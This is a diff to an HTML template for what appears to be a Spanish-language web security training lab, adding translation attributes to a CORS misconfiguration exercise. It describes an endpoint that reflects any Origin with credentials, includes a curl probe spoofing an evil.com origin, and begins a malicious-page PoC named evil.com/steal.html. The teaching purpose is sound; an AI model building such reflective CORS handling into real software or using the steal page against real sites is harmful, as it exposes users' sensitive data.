@@ -6,29 +6,29 @@
 
   <div class="hl-card mb-4">
     <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">
-      <i class="ph ph-globe text-sm"></i> API de datos internos
+      <i class="ph ph-globe text-sm"></i> <span data-i18n="cors_api_title">API de datos internos</span>
     </div>
-    <p class="text-sm text-gray-400 mb-4">
+    <p class="text-sm text-gray-400 mb-4" data-i18n="cors_api_desc">
       La API devuelve datos sensibles y refleja cualquier cabecera <code>Origin</code> con
       <code>Access-Control-Allow-Credentials: true</code>.
     </p>
     <div class="hl-code">
-      <div class="text-gray-400"># Endpoint vulnerable</div>
+      <div class="text-gray-400" data-i18n="cors_comment1"># Endpoint vulnerable</div>
       <div>GET /cors/data</div>
-      <div class="text-gray-400 mt-2"># Probar con curl (observa las cabeceras CORS)</div>
+      <div class="text-gray-400 mt-2" data-i18n="cors_comment2"># Probar con curl (observa las cabeceras CORS)</div>
       <div>curl -H "Origin: https://evil.com" -I http://localhost:5000/cors/data</div>
     </div>
     <button onclick="fetchCorsData()" class="btn-primary mt-4">
-      <i class="ph ph-arrow-square-out text-sm"></i> Hacer petición cross-origin
+      <i class="ph ph-arrow-square-out text-sm"></i> <span data-i18n="cors_btn">Hacer petición cross-origin</span>
     </button>
     <div id="cors-result" class="hidden mt-4 p-3 rounded-lg border bg-dark-900 border-gray-700">
-      <div class="text-xs text-gray-400 mb-2">Respuesta:</div>
+      <div class="text-xs text-gray-400 mb-2" data-i18n="cors_response">Respuesta:</div>
       <pre id="cors-output" class="text-green-400 text-xs font-mono"></pre>
     </div>
   </div>
 
   <div class="hl-card mb-4">
-    <div class="text-xs font-semibold uppercase tracking-wider mb-3 text-gray-400">PoC – Página maliciosa</div>
+    <div class="text-xs font-semibold uppercase tracking-wider mb-3 text-gray-400" data-i18n="cors_poc_title">PoC – Página maliciosa</div>
     <div class="hl-code">
       <div class="text-gray-400">&lt;!-- evil.com/steal.html --&gt;</div>
       <div>&lt;script&gt;</div>
